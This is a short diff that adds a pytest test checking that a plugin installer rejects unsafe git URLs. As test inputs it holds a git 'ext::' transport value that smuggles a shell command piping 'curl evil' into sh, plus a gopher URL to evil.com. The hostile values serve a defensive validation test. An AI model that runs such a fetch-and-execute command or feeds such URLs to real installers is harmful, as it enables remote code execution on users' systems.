@@ -166,3 +166,13 @@ def test_cli_plugin_install_requires_url():
     runner = CliRunner()
     result = runner.invoke(app, ["plugin", "install"])
     assert result.exit_code != 0
+
+
+def test_installer_rejects_unsafe_git_urls(tmp_path, monkeypatch):
+    monkeypatch.setattr("pathlib.Path.home", lambda: tmp_path)
+    installer = PluginInstaller()
+    with pytest.raises(ValueError, match="Unsupported or unsafe git transport protocol"):
+        installer.install('ext::sh -c "curl evil|sh"')
+
+    with pytest.raises(ValueError, match="Disallowed git URL scheme"):
+        installer.install("gopher://evil.com/payload")
